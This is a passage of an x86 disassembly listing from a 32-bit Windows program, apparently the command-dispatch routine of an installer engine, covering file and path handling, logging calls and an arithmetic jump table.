  401714:	0f 44 c1             	cmove  %ecx,%eax
  401717:	8b 44 04 30          	mov    0x30(%esp,%eax,1),%eax
  40171b:	e9 94 1c 00 00       	jmp    0x4033b4
  401720:	ff 34 95 e0 e2 47 00 	push   0x47e2e0(,%edx,4)
  401727:	57                   	push   %edi
  401728:	e8 60 56 00 00       	call   0x406d8d
  40172d:	e9 76 1c 00 00       	jmp    0x4033a8
  401732:	a1 04 62 47 00       	mov    0x476204,%eax
  401737:	8b 35 54 92 40 00    	mov    0x409254,%esi
  40173d:	85 c0                	test   %eax,%eax
  40173f:	74 08                	je     0x401749
  401741:	52                   	push   %edx
  401742:	50                   	push   %eax
  401743:	ff d6                	call   *%esi
  401745:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  401749:	a1 08 62 47 00       	mov    0x476208,%eax
  40174e:	85 c0                	test   %eax,%eax
  401750:	0f 84 52 1c 00 00    	je     0x4033a8
  401756:	51                   	push   %ecx
  401757:	50                   	push   %eax
  401758:	ff d6                	call   *%esi
  40175a:	e9 49 1c 00 00       	jmp    0x4033a8
  40175f:	6a f0                	push   $0xfffffff0
  401761:	e8 e5 1d 00 00       	call   0x40354b
  401766:	ff 74 24 34          	push   0x34(%esp)
  40176a:	8b f0                	mov    %eax,%esi
  40176c:	56                   	push   %esi
  40176d:	68 78 93 40 00       	push   $0x409378
  401772:	e8 ad 56 00 00       	call   0x406e24
  401777:	83 c4 0c             	add    $0xc,%esp
  40177a:	ff 74 24 34          	push   0x34(%esp)
  40177e:	56                   	push   %esi
  40177f:	ff 15 1c 91 40 00    	call   *0x40911c
  401785:	85 c0                	test   %eax,%eax
  401787:	0f 85 1b 1c 00 00    	jne    0x4033a8
  40178d:	33 db                	xor    %ebx,%ebx
  40178f:	43                   	inc    %ebx
  401790:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  401794:	68 b4 93 40 00       	push   $0x4093b4
  401799:	e8 86 56 00 00       	call   0x406e24
  40179e:	59                   	pop    %ecx
  40179f:	e9 04 1c 00 00       	jmp    0x4033a8
  4017a4:	6a f0                	push   $0xfffffff0
  4017a6:	e8 a0 1d 00 00       	call   0x40354b
  4017ab:	ff 74 24 34          	push   0x34(%esp)
  4017af:	8b f0                	mov    %eax,%esi
  4017b1:	56                   	push   %esi
  4017b2:	68 e8 93 40 00       	push   $0x4093e8
  4017b7:	e8 68 56 00 00       	call   0x406e24
  4017bc:	83 c4 0c             	add    $0xc,%esp
  4017bf:	56                   	push   %esi
  4017c0:	e8 96 5c 00 00       	call   0x40745b
  4017c5:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4017c9:	8b f8                	mov    %eax,%edi
  4017cb:	85 ff                	test   %edi,%edi
  4017cd:	0f 84 8a 00 00 00    	je     0x40185d
  4017d3:	6a 5c                	push   $0x5c
  4017d5:	57                   	push   %edi
  4017d6:	e8 89 55 00 00       	call   0x406d64
  4017db:	8b f8                	mov    %eax,%edi
  4017dd:	33 c0                	xor    %eax,%eax
  4017df:	0f b7 2f             	movzwl (%edi),%ebp
  4017e2:	66 89 07             	mov    %ax,(%edi)
  4017e5:	66 85 ed             	test   %bp,%bp
  4017e8:	75 17                	jne    0x401801
  4017ea:	39 44 24 38          	cmp    %eax,0x38(%esp)
  4017ee:	74 11                	je     0x401801
  4017f0:	e8 dd 52 00 00       	call   0x406ad2
  4017f5:	85 c0                	test   %eax,%eax
  4017f7:	74 08                	je     0x401801
  4017f9:	56                   	push   %esi
  4017fa:	e8 16 4c 00 00       	call   0x406415
  4017ff:	eb 06                	jmp    0x401807
  401801:	56                   	push   %esi
  401802:	e8 ee 4b 00 00       	call   0x4063f5
  401807:	85 c0                	test   %eax,%eax
  401809:	74 32                	je     0x40183d
  40180b:	3d b7 00 00 00       	cmp    $0xb7,%eax
  401810:	74 12                	je     0x401824
  401812:	50                   	push   %eax
  401813:	56                   	push   %esi
  401814:	68 20 94 40 00       	push   $0x409420
  401819:	e8 06 56 00 00       	call   0x406e24
  40181e:	83 c4 0c             	add    $0xc,%esp
  401821:	43                   	inc    %ebx
  401822:	eb 26                	jmp    0x40184a
  401824:	56                   	push   %esi
  401825:	ff 15 2c 91 40 00    	call   *0x40912c
  40182b:	a8 10                	test   $0x10,%al
  40182d:	75 1b                	jne    0x40184a
  40182f:	56                   	push   %esi
  401830:	68 78 94 40 00       	push   $0x409478
  401835:	e8 ea 55 00 00       	call   0x406e24
  40183a:	43                   	inc    %ebx
  40183b:	eb 0b                	jmp    0x401848
  40183d:	56                   	push   %esi
  40183e:	68 f0 94 40 00       	push   $0x4094f0
  401843:	e8 dc 55 00 00       	call   0x406e24
  401848:	59                   	pop    %ecx
  401849:	59                   	pop    %ecx
  40184a:	66 89 2f             	mov    %bp,(%edi)
  40184d:	83 c7 02             	add    $0x2,%edi
  401850:	66 85 ed             	test   %bp,%bp
  401853:	0f 85 7a ff ff ff    	jne    0x4017d3
  401859:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40185d:	83 7c 24 34 00       	cmpl   $0x0,0x34(%esp)
  401862:	68 08 01 41 00       	push   $0x410108
  401867:	74 3c                	je     0x4018a5
  401869:	6a e6                	push   $0xffffffe6
  40186b:	e8 a1 4a 00 00       	call   0x406311
  401870:	56                   	push   %esi
  401871:	68 00 70 4d 00       	push   $0x4d7000
  401876:	e8 35 5b 00 00       	call   0x4073b0
  40187b:	56                   	push   %esi
  40187c:	ff 15 48 91 40 00    	call   *0x409148
  401882:	85 c0                	test   %eax,%eax
  401884:	0f 85 1e 1b 00 00    	jne    0x4033a8
  40188a:	ff 15 0c 91 40 00    	call   *0x40910c
  401890:	50                   	push   %eax
  401891:	56                   	push   %esi
  401892:	68 30 95 40 00       	push   $0x409530
  401897:	e8 88 55 00 00       	call   0x406e24
  40189c:	83 c4 0c             	add    $0xc,%esp
  40189f:	43                   	inc    %ebx
  4018a0:	e9 8c 01 00 00       	jmp    0x401a31
  4018a5:	6a f5                	push   $0xfffffff5
  4018a7:	e9 b3 fd ff ff       	jmp    0x40165f
  4018ac:	55                   	push   %ebp
  4018ad:	e8 99 1c 00 00       	call   0x40354b
  4018b2:	8b f0                	mov    %eax,%esi
  4018b4:	56                   	push   %esi
  4018b5:	e8 83 54 00 00       	call   0x406d3d
  4018ba:	85 c0                	test   %eax,%eax
  4018bc:	74 1b                	je     0x4018d9
  4018be:	ff 74 24 34          	push   0x34(%esp)
  4018c2:	56                   	push   %esi
  4018c3:	68 78 95 40 00       	push   $0x409578
  4018c8:	e8 57 55 00 00       	call   0x406e24
  4018cd:	83 c4 0c             	add    $0xc,%esp
  4018d0:	8b 44 24 34          	mov    0x34(%esp),%eax
  4018d4:	e9 db 1a 00 00       	jmp    0x4033b4
  4018d9:	ff 74 24 38          	push   0x38(%esp)
  4018dd:	56                   	push   %esi
  4018de:	68 d0 95 40 00       	push   $0x4095d0
  4018e3:	e8 3c 55 00 00       	call   0x406e24
  4018e8:	83 c4 0c             	add    $0xc,%esp
  4018eb:	8b 44 24 38          	mov    0x38(%esp),%eax
  4018ef:	e9 c0 1a 00 00       	jmp    0x4033b4
  4018f4:	6a d0                	push   $0xffffffd0
  4018f6:	e8 50 1c 00 00       	call   0x40354b
  4018fb:	6a df                	push   $0xffffffdf
  4018fd:	8b f8                	mov    %eax,%edi
  4018ff:	e8 47 1c 00 00       	call   0x40354b
  401904:	6a 13                	push   $0x13
  401906:	8b e8                	mov    %eax,%ebp
  401908:	e8 3e 1c 00 00       	call   0x40354b
  40190d:	8b f0                	mov    %eax,%esi
  40190f:	56                   	push   %esi
  401910:	68 38 96 40 00       	push   $0x409638
  401915:	e8 0a 55 00 00       	call   0x406e24
  40191a:	59                   	pop    %ecx
  40191b:	59                   	pop    %ecx
  40191c:	55                   	push   %ebp
  40191d:	57                   	push   %edi
  40191e:	ff 15 d8 90 40 00    	call   *0x4090d8
  401924:	85 c0                	test   %eax,%eax
  401926:	74 0c                	je     0x401934
  401928:	68 08 01 41 00       	push   $0x410108
  40192d:	6a e3                	push   $0xffffffe3
  40192f:	e9 2b fd ff ff       	jmp    0x40165f
  401934:	83 7c 24 38 00       	cmpl   $0x0,0x38(%esp)
  401939:	74 25                	je     0x401960
  40193b:	57                   	push   %edi
  40193c:	e8 fc 53 00 00       	call   0x406d3d
  401941:	85 c0                	test   %eax,%eax
  401943:	74 1b                	je     0x401960
  401945:	55                   	push   %ebp
  401946:	57                   	push   %edi
  401947:	e8 c7 4e 00 00       	call   0x406813
  40194c:	68 08 01 41 00       	push   $0x410108
  401951:	6a e4                	push   $0xffffffe4
  401953:	e8 b9 49 00 00       	call   0x406311
  401958:	56                   	push   %esi
  401959:	68 50 96 40 00       	push   $0x409650
  40195e:	eb 0d                	jmp    0x40196d
  401960:	56                   	push   %esi
  401961:	68 7c 96 40 00       	push   $0x40967c
  401966:	33 db                	xor    %ebx,%ebx
  401968:	43                   	inc    %ebx
  401969:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  40196d:	e8 b2 54 00 00       	call   0x406e24
  401972:	59                   	pop    %ecx
  401973:	e9 26 fe ff ff       	jmp    0x40179e
  401978:	55                   	push   %ebp
  401979:	e8 cd 1b 00 00       	call   0x40354b
  40197e:	8b f8                	mov    %eax,%edi
  401980:	8d 44 24 18          	lea    0x18(%esp),%eax
  401984:	50                   	push   %eax
  401985:	56                   	push   %esi
  401986:	68 00 20 00 00       	push   $0x2000
  40198b:	57                   	push   %edi
  40198c:	ff 15 28 91 40 00    	call   *0x409128
  401992:	85 c0                	test   %eax,%eax
  401994:	74 26                	je     0x4019bc
  401996:	8b 44 24 18          	mov    0x18(%esp),%eax
  40199a:	3b c7                	cmp    %edi,%eax
  40199c:	76 2a                	jbe    0x4019c8
  40199e:	66 39 28             	cmp    %bp,(%eax)
  4019a1:	74 25                	je     0x4019c8
  4019a3:	57                   	push   %edi
  4019a4:	e8 94 53 00 00       	call   0x406d3d
  4019a9:	85 c0                	test   %eax,%eax
  4019ab:	74 0f                	je     0x4019bc
  4019ad:	83 c0 2c             	add    $0x2c,%eax
  4019b0:	50                   	push   %eax
  4019b1:	ff 74 24 1c          	push   0x1c(%esp)
  4019b5:	e8 f6 59 00 00       	call   0x4073b0
  4019ba:	eb 0c                	jmp    0x4019c8
  4019bc:	33 db                	xor    %ebx,%ebx
  4019be:	43                   	inc    %ebx
  4019bf:	33 c0                	xor    %eax,%eax
  4019c1:	66 89 06             	mov    %ax,(%esi)
  4019c4:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4019c8:	39 6c 24 38          	cmp    %ebp,0x38(%esp)
  4019cc:	0f 85 d6 19 00 00    	jne    0x4033a8
  4019d2:	68 00 20 00 00       	push   $0x2000
  4019d7:	56                   	push   %esi
  4019d8:	56                   	push   %esi
  4019d9:	ff 15 24 91 40 00    	call   *0x409124
  4019df:	e9 c4 19 00 00       	jmp    0x4033a8
  4019e4:	6a ff                	push   $0xffffffff
  4019e6:	e8 60 1b 00 00       	call   0x40354b
  4019eb:	8d 4c 24 54          	lea    0x54(%esp),%ecx
  4019ef:	51                   	push   %ecx
  4019f0:	57                   	push   %edi
  4019f1:	68 00 20 00 00       	push   $0x2000
  4019f6:	55                   	push   %ebp
  4019f7:	50                   	push   %eax
  4019f8:	55                   	push   %ebp
  4019f9:	ff 15 44 91 40 00    	call   *0x409144
  4019ff:	85 c0                	test   %eax,%eax
  401a01:	0f 85 a1 19 00 00    	jne    0x4033a8
  401a07:	33 db                	xor    %ebx,%ebx
  401a09:	43                   	inc    %ebx
  401a0a:	33 c0                	xor    %eax,%eax
  401a0c:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  401a10:	66 89 07             	mov    %ax,(%edi)
  401a13:	e9 90 19 00 00       	jmp    0x4033a8
  401a18:	6a ef                	push   $0xffffffef
  401a1a:	e8 2c 1b 00 00       	call   0x40354b
  401a1f:	50                   	push   %eax
  401a20:	57                   	push   %edi
  401a21:	e8 c6 58 00 00       	call   0x4072ec
  401a26:	85 c0                	test   %eax,%eax
  401a28:	0f 85 7a 19 00 00    	jne    0x4033a8
  401a2e:	33 db                	xor    %ebx,%ebx
  401a30:	43                   	inc    %ebx
  401a31:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  401a35:	e9 6e 19 00 00       	jmp    0x4033a8
  401a3a:	6a 31                	push   $0x31
  401a3c:	e8 0a 1b 00 00       	call   0x40354b
  401a41:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  401a45:	8b f0                	mov    %eax,%esi
  401a47:	8b c1                	mov    %ecx,%eax
  401a49:	89 74 24 18          	mov    %esi,0x18(%esp)
  401a4d:	c1 f9 03             	sar    $0x3,%ecx
  401a50:	83 e0 07             	and    $0x7,%eax
  401a53:	56                   	push   %esi
  401a54:	83 e1 02             	and    $0x2,%ecx
  401a57:	89 44 24 20          	mov    %eax,0x20(%esp)
  401a5b:	51                   	push   %ecx
  401a5c:	50                   	push   %eax
  401a5d:	68 a0 96 40 00       	push   $0x4096a0
  401a62:	e8 bd 53 00 00       	call   0x406e24
  401a67:	83 c4 10             	add    $0x10,%esp
  401a6a:	56                   	push   %esi
  401a6b:	e8 27 5c 00 00       	call   0x407697
  401a70:	bf 08 c1 40 00       	mov    $0x40c108,%edi
  401a75:	56                   	push   %esi
  401a76:	85 c0                	test   %eax,%eax
  401a78:	74 08                	je     0x401a82
  401a7a:	57                   	push   %edi
  401a7b:	e8 30 59 00 00       	call   0x4073b0
  401a80:	eb 17                	jmp    0x401a99
  401a82:	68 00 70 4d 00       	push   $0x4d7000
  401a87:	57                   	push   %edi
  401a88:	e8 23 59 00 00       	call   0x4073b0
  401a8d:	50                   	push   %eax
  401a8e:	e8 31 52 00 00       	call   0x406cc4
  401a93:	50                   	push   %eax
  401a94:	e8 11 59 00 00       	call   0x4073aa
  401a99:	57                   	push   %edi
  401a9a:	e8 34 5b 00 00       	call   0x4075d3
  401a9f:	33 f6                	xor    %esi,%esi
  401aa1:	46                   	inc    %esi
  401aa2:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401aa6:	83 f8 03             	cmp    $0x3,%eax
  401aa9:	7c 34                	jl     0x401adf
  401aab:	57                   	push   %edi
  401aac:	e8 8c 52 00 00       	call   0x406d3d
  401ab1:	8b cd                	mov    %ebp,%ecx
  401ab3:	85 c0                	test   %eax,%eax
  401ab5:	74 11                	je     0x401ac8
  401ab7:	8d 4c 24 3c          	lea    0x3c(%esp),%ecx
  401abb:	83 c0 14             	add    $0x14,%eax
  401abe:	51                   	push   %ecx
  401abf:	50                   	push   %eax
  401ac0:	ff 15 40 91 40 00    	call   *0x409140
  401ac6:	8b c8                	mov    %eax,%ecx
  401ac8:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401acc:	83 c0 fd             	add    $0xfffffffd,%eax
  401acf:	0d 00 00 00 80       	or     $0x80000000,%eax
  401ad4:	23 c1                	and    %ecx,%eax
  401ad6:	f7 d8                	neg    %eax
  401ad8:	1b c0                	sbb    %eax,%eax
  401ada:	40                   	inc    %eax
  401adb:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401adf:	85 c0                	test   %eax,%eax
  401ae1:	75 06                	jne    0x401ae9
  401ae3:	57                   	push   %edi
  401ae4:	e8 4a 59 00 00       	call   0x407433
  401ae9:	33 c0                	xor    %eax,%eax
  401aeb:	39 74 24 1c          	cmp    %esi,0x1c(%esp)
  401aef:	0f 95 c0             	setne  %al
  401af2:	40                   	inc    %eax
  401af3:	50                   	push   %eax
  401af4:	68 00 00 00 40       	push   $0x40000000
  401af9:	57                   	push   %edi
  401afa:	e8 b2 56 00 00       	call   0x4071b1
  401aff:	89 44 24 14          	mov    %eax,0x14(%esp)
  401b03:	83 f8 ff             	cmp    $0xffffffff,%eax
  401b06:	0f 85 cf 00 00 00    	jne    0x401bdb
  401b0c:	39 6c 24 1c          	cmp    %ebp,0x1c(%esp)
  401b10:	0f 85 99 00 00 00    	jne    0x401baf
  401b16:	57                   	push   %edi
  401b17:	68 68 97 40 00       	push   $0x409768
  401b1c:	e8 03 53 00 00       	call   0x406e24
  401b21:	59                   	pop    %ecx
  401b22:	59                   	pop    %ecx
  401b23:	68 00 f0 47 00       	push   $0x47f000
  401b28:	68 08 41 41 00       	push   $0x414108
  401b2d:	e8 7e 58 00 00       	call   0x4073b0
  401b32:	57                   	push   %edi
  401b33:	68 00 f0 47 00       	push   $0x47f000
  401b38:	e8 73 58 00 00       	call   0x4073b0
  401b3d:	ff 74 24 44          	push   0x44(%esp)
  401b41:	68 08 01 41 00       	push   $0x410108
  401b46:	e8 46 49 00 00       	call   0x406491
  401b4b:	68 08 41 41 00       	push   $0x414108
  401b50:	68 00 f0 47 00       	push   $0x47f000
  401b55:	e8 56 58 00 00       	call   0x4073b0
  401b5a:	8b 44 24 30          	mov    0x30(%esp),%eax
  401b5e:	c1 f8 03             	sar    $0x3,%eax
  401b61:	50                   	push   %eax
  401b62:	68 08 01 41 00       	push   $0x410108
  401b67:	e8 d2 57 00 00       	call   0x40733e
  401b6c:	83 e8 04             	sub    $0x4,%eax
  401b6f:	75 10                	jne    0x401b81
  401b71:	68 9c 97 40 00       	push   $0x40979c
  401b76:	e8 a9 52 00 00       	call   0x406e24
  401b7b:	59                   	pop    %ecx
  401b7c:	e9 21 ff ff ff       	jmp    0x401aa2
  401b81:	83 e8 01             	sub    $0x1,%eax
  401b84:	74 13                	je     0x401b99
  401b86:	68 00 98 40 00       	push   $0x409800
  401b8b:	e8 94 52 00 00       	call   0x406e24
  401b90:	59                   	pop    %ecx
  401b91:	57                   	push   %edi
  401b92:	6a fa                	push   $0xfffffffa
  401b94:	e9 6a fa ff ff       	jmp    0x401603
  401b99:	68 cc 97 40 00       	push   $0x4097cc
  401b9e:	e8 81 52 00 00       	call   0x406e24
  401ba3:	ff 05 e8 e2 47 00    	incl   0x47e2e8
  401ba9:	59                   	pop    %ecx
  401baa:	e9 03 18 00 00       	jmp    0x4033b2
  401baf:	8b 74 24 18          	mov    0x18(%esp),%esi
  401bb3:	56                   	push   %esi
  401bb4:	6a e2                	push   $0xffffffe2
  401bb6:	e8 56 47 00 00       	call   0x406311
  401bbb:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  401bbf:	55                   	push   %ebp
  401bc0:	57                   	push   %edi
  401bc1:	68 18 97 40 00       	push   $0x409718
  401bc6:	e8 59 52 00 00       	call   0x406e24
  401bcb:	83 c4 0c             	add    $0xc,%esp
  401bce:	33 db                	xor    %ebx,%ebx
  401bd0:	83 fd 02             	cmp    $0x2,%ebp
  401bd3:	0f 94 c3             	sete   %bl
  401bd6:	e9 56 fe ff ff       	jmp    0x401a31
  401bdb:	8b 74 24 18          	mov    0x18(%esp),%esi
  401bdf:	56                   	push   %esi
  401be0:	6a ea                	push   $0xffffffea
  401be2:	e8 2a 47 00 00       	call   0x406311
  401be7:	ff 05 14 e3 47 00    	incl   0x47e314
  401bed:	55                   	push   %ebp
  401bee:	55                   	push   %ebp
  401bef:	ff 74 24 1c          	push   0x1c(%esp)
  401bf3:	ff 74 24 44          	push   0x44(%esp)
  401bf7:	e8 59 1a 00 00       	call   0x403655
  401bfc:	ff 0d 14 e3 47 00    	decl   0x47e314
  401c02:	57                   	push   %edi
  401c03:	50                   	push   %eax
  401c04:	68 30 98 40 00       	push   $0x409830
  401c09:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  401c0d:	e8 12 52 00 00       	call   0x406e24
  401c12:	83 c4 0c             	add    $0xc,%esp
  401c15:	83 7c 24 3c ff       	cmpl   $0xffffffff,0x3c(%esp)
  401c1a:	75 07                	jne    0x401c23
  401c1c:	83 7c 24 40 ff       	cmpl   $0xffffffff,0x40(%esp)
  401c21:	74 11                	je     0x401c34
  401c23:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  401c27:	50                   	push   %eax
  401c28:	55                   	push   %ebp
  401c29:	50                   	push   %eax
  401c2a:	ff 74 24 20          	push   0x20(%esp)
  401c2e:	ff 15 14 91 40 00    	call   *0x409114
  401c34:	ff 74 24 14          	push   0x14(%esp)
  401c38:	ff 15 10 91 40 00    	call   *0x409110
  401c3e:	8b 44 24 20          	mov    0x20(%esp),%eax
  401c42:	85 c0                	test   %eax,%eax
  401c44:	0f 89 5e 17 00 00    	jns    0x4033a8
  401c4a:	83 f8 fe             	cmp    $0xfffffffe,%eax
  401c4d:	75 11                	jne    0x401c60
  401c4f:	6a e9                	push   $0xffffffe9
  401c51:	57                   	push   %edi
  401c52:	e8 3a 48 00 00       	call   0x406491
  401c57:	56                   	push   %esi
  401c58:	57                   	push   %edi
  401c59:	e8 4c 57 00 00       	call   0x4073aa
  401c5e:	eb 08                	jmp    0x401c68
  401c60:	6a ee                	push   $0xffffffee
  401c62:	57                   	push   %edi
  401c63:	e8 29 48 00 00       	call   0x406491
  401c68:	57                   	push   %edi
  401c69:	68 60 98 40 00       	push   $0x409860
  401c6e:	e8 b1 51 00 00       	call   0x406e24
  401c73:	59                   	pop    %ecx
  401c74:	59                   	pop    %ecx
  401c75:	68 10 00 20 00       	push   $0x200010
  401c7a:	57                   	push   %edi
  401c7b:	e8 be 56 00 00       	call   0x40733e
  401c80:	e9 83 f9 ff ff       	jmp    0x401608
  401c85:	55                   	push   %ebp
  401c86:	e8 c0 18 00 00       	call   0x40354b
  401c8b:	8b f0                	mov    %eax,%esi
  401c8d:	56                   	push   %esi
  401c8e:	68 68 98 40 00       	push   $0x409868
  401c93:	e8 8c 51 00 00       	call   0x406e24
  401c98:	59                   	pop    %ecx
  401c99:	59                   	pop    %ecx
  401c9a:	ff 74 24 34          	push   0x34(%esp)
  401c9e:	56                   	push   %esi
  401c9f:	e8 b1 52 00 00       	call   0x406f55
  401ca4:	e9 ff 16 00 00       	jmp    0x4033a8
  401ca9:	6a 31                	push   $0x31
  401cab:	e8 9b 18 00 00       	call   0x40354b
  401cb0:	8b f0                	mov    %eax,%esi
  401cb2:	56                   	push   %esi
  401cb3:	ff 74 24 34          	push   0x34(%esp)
  401cb7:	68 84 98 40 00       	push   $0x409884
  401cbc:	e8 63 51 00 00       	call   0x406e24
  401cc1:	83 c4 0c             	add    $0xc,%esp
  401cc4:	ff 74 24 30          	push   0x30(%esp)
  401cc8:	56                   	push   %esi
  401cc9:	e8 70 56 00 00       	call   0x40733e
  401cce:	85 c0                	test   %eax,%eax
  401cd0:	0f 84 58 fd ff ff    	je     0x401a2e
  401cd6:	3b 44 24 38          	cmp    0x38(%esp),%eax
  401cda:	0f 84 60 01 00 00    	je     0x401e40
  401ce0:	3b 44 24 40          	cmp    0x40(%esp),%eax
  401ce4:	0f 85 be 16 00 00    	jne    0x4033a8
  401cea:	8b 44 24 44          	mov    0x44(%esp),%eax
  401cee:	e9 c1 16 00 00       	jmp    0x4033b4
  401cf3:	6a f0                	push   $0xfffffff0
  401cf5:	e8 51 18 00 00       	call   0x40354b
  401cfa:	8b f0                	mov    %eax,%esi
  401cfc:	56                   	push   %esi
  401cfd:	68 ac 98 40 00       	push   $0x4098ac
  401d02:	eb 8f                	jmp    0x401c93
  401d04:	6a 01                	push   $0x1
  401d06:	e8 40 18 00 00       	call   0x40354b
  401d0b:	50                   	push   %eax
  401d0c:	e8 b5 56 00 00       	call   0x4073c6
  401d11:	50                   	push   %eax
  401d12:	e9 10 fa ff ff       	jmp    0x401727
  401d17:	6a 02                	push   $0x2
  401d19:	e8 f1 17 00 00       	call   0x40350f
  401d1e:	6a 03                	push   $0x3
  401d20:	8b e8                	mov    %eax,%ebp
  401d22:	8b f2                	mov    %edx,%esi
  401d24:	e8 e6 17 00 00       	call   0x40350f
  401d29:	59                   	pop    %ecx
  401d2a:	59                   	pop    %ecx
  401d2b:	6a 01                	push   $0x1
  401d2d:	89 44 24 24          	mov    %eax,0x24(%esp)
  401d31:	e8 15 18 00 00       	call   0x40354b
  401d36:	50                   	push   %eax
  401d37:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401d3b:	e8 86 56 00 00       	call   0x4073c6
  401d40:	8b c8                	mov    %eax,%ecx
  401d42:	33 c0                	xor    %eax,%eax
  401d44:	85 f6                	test   %esi,%esi
  401d46:	66 89 07             	mov    %ax,(%edi)
  401d49:	0f 44 e9             	cmove  %ecx,%ebp
  401d4c:	85 ed                	test   %ebp,%ebp
  401d4e:	0f 84 54 16 00 00    	je     0x4033a8
  401d54:	8b 44 24 20          	mov    0x20(%esp),%eax
  401d58:	85 c0                	test   %eax,%eax
  401d5a:	79 08                	jns    0x401d64
  401d5c:	03 c1                	add    %ecx,%eax
  401d5e:	0f 88 44 16 00 00    	js     0x4033a8
  401d64:	3b c1                	cmp    %ecx,%eax
  401d66:	0f 4f c1             	cmovg  %ecx,%eax
  401d69:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  401d6d:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  401d70:	50                   	push   %eax
  401d71:	57                   	push   %edi
  401d72:	e8 39 56 00 00       	call   0x4073b0
  401d77:	85 ed                	test   %ebp,%ebp
  401d79:	79 08                	jns    0x401d83
  401d7b:	57                   	push   %edi
  401d7c:	e8 45 56 00 00       	call   0x4073c6
  401d81:	03 e8                	add    %eax,%ebp
  401d83:	33 c0                	xor    %eax,%eax
  401d85:	85 ed                	test   %ebp,%ebp
  401d87:	0f 49 c5             	cmovns %ebp,%eax
  401d8a:	3d 00 20 00 00       	cmp    $0x2000,%eax
  401d8f:	0f 8d 13 16 00 00    	jge    0x4033a8
  401d95:	33 c9                	xor    %ecx,%ecx
  401d97:	66 89 0c 47          	mov    %cx,(%edi,%eax,2)
  401d9b:	e9 08 16 00 00       	jmp    0x4033a8
  401da0:	6a 20                	push   $0x20
  401da2:	e8 a4 17 00 00       	call   0x40354b
  401da7:	6a 31                	push   $0x31
  401da9:	8b f0                	mov    %eax,%esi
  401dab:	e8 9b 17 00 00       	call   0x40354b
  401db0:	50                   	push   %eax
  401db1:	56                   	push   %esi
  401db2:	39 6c 24 48          	cmp    %ebp,0x48(%esp)
  401db6:	75 10                	jne    0x401dc8
  401db8:	ff 15 e8 90 40 00    	call   *0x4090e8
  401dbe:	85 c0                	test   %eax,%eax
  401dc0:	0f 84 25 fb ff ff    	je     0x4018eb
  401dc6:	eb 78                	jmp    0x401e40
  401dc8:	ff 15 ec 90 40 00    	call   *0x4090ec
  401dce:	eb ee                	jmp    0x401dbe
  401dd0:	33 ed                	xor    %ebp,%ebp
  401dd2:	45                   	inc    %ebp
  401dd3:	55                   	push   %ebp
  401dd4:	e8 72 17 00 00       	call   0x40354b
  401dd9:	68 00 20 00 00       	push   $0x2000
  401dde:	8b f0                	mov    %eax,%esi
  401de0:	57                   	push   %edi
  401de1:	56                   	push   %esi
  401de2:	ff 15 4c 91 40 00    	call   *0x40914c
  401de8:	85 c0                	test   %eax,%eax
  401dea:	74 13                	je     0x401dff
  401dec:	83 7c 24 38 00       	cmpl   $0x0,0x38(%esp)
  401df1:	74 17                	je     0x401e0a
  401df3:	57                   	push   %edi
  401df4:	56                   	push   %esi
  401df5:	ff 15 ec 90 40 00    	call   *0x4090ec
  401dfb:	85 c0                	test   %eax,%eax
  401dfd:	75 0b                	jne    0x401e0a
  401dff:	8b dd                	mov    %ebp,%ebx
  401e01:	33 c0                	xor    %eax,%eax
  401e03:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  401e07:	66 89 07             	mov    %ax,(%edi)
  401e0a:	33 c0                	xor    %eax,%eax
  401e0c:	66 89 87 fe 3f 00 00 	mov    %ax,0x3ffe(%edi)
  401e13:	e9 90 15 00 00       	jmp    0x4033a8
  401e18:	8b 74 24 44          	mov    0x44(%esp),%esi
  401e1c:	55                   	push   %ebp
  401e1d:	e8 ed 16 00 00       	call   0x40350f
  401e22:	6a 01                	push   $0x1
  401e24:	8b f8                	mov    %eax,%edi
  401e26:	e8 e4 16 00 00       	call   0x40350f
  401e2b:	59                   	pop    %ecx
  401e2c:	59                   	pop    %ecx
  401e2d:	85 f6                	test   %esi,%esi
  401e2f:	75 0b                	jne    0x401e3c
  401e31:	3b f8                	cmp    %eax,%edi
  401e33:	7c 0b                	jl     0x401e40
  401e35:	7f 18                	jg     0x401e4f
  401e37:	e9 af fa ff ff       	jmp    0x4018eb
  401e3c:	3b f8                	cmp    %eax,%edi
  401e3e:	73 09                	jae    0x401e49
  401e40:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  401e44:	e9 6b 15 00 00       	jmp    0x4033b4
  401e49:	0f 86 9c fa ff ff    	jbe    0x4018eb
  401e4f:	8b 44 24 40          	mov    0x40(%esp),%eax
  401e53:	e9 5c 15 00 00       	jmp    0x4033b4
  401e58:	6a 01                	push   $0x1
  401e5a:	e8 b0 16 00 00       	call   0x40350f
  401e5f:	6a 02                	push   $0x2
  401e61:	8b f0                	mov    %eax,%esi
  401e63:	e8 a7 16 00 00       	call   0x40350f
  401e68:	59                   	pop    %ecx
  401e69:	59                   	pop    %ecx
  401e6a:	8b c8                	mov    %eax,%ecx
  401e6c:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  401e70:	83 f8 0d             	cmp    $0xd,%eax
  401e73:	77 73                	ja     0x401ee8
  401e75:	ff 24 85 d7 34 40 00 	jmp    *0x4034d7(,%eax,4)
  401e7c:	03 f1                	add    %ecx,%esi
  401e7e:	eb 68                	jmp    0x401ee8
  401e80:	2b f1                	sub    %ecx,%esi
  401e82:	eb 64                	jmp    0x401ee8
  401e84:	0f af f1             	imul   %ecx,%esi
  401e87:	eb 5f                	jmp    0x401ee8
  401e89:	85 c9                	test   %ecx,%ecx
  401e8b:	74 09                	je     0x401e96
  401e8d:	8b c6                	mov    %esi,%eax
  401e8f:	99                   	cltd
  401e90:	f7 f9                	idiv   %ecx
  401e92:	8b f0                	mov    %eax,%esi
